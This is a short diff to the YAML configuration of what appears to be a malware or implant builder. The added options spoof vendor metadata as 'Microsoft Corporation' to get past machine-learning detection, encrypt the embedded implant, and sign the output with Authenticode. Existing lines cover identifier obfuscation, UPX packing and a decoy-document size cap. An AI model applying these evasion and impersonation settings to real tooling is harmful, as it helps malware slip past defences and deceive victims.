@@ -22,6 +22,11 @@ builder:
   public_url: ""          # empty -> auto-detect from the dashboard request
   garble: false           # obfuscate identifiers if garble is installed
   upx: false              # compress binaries if upx is installed
+  metadata: true          # vendor metadata + manifest + icon (anti-ML)
+  encrypt_payload: true   # AES-GCM seal the embedded implant
+  vendor: "Microsoft Corporation"
+  sign_pfx: ""            # optional .pfx -> Authenticode sign every artifact
+  sign_pass: ""
   max_bind_size: 67108864 # 64 MB decoy document cap
 
 socks:
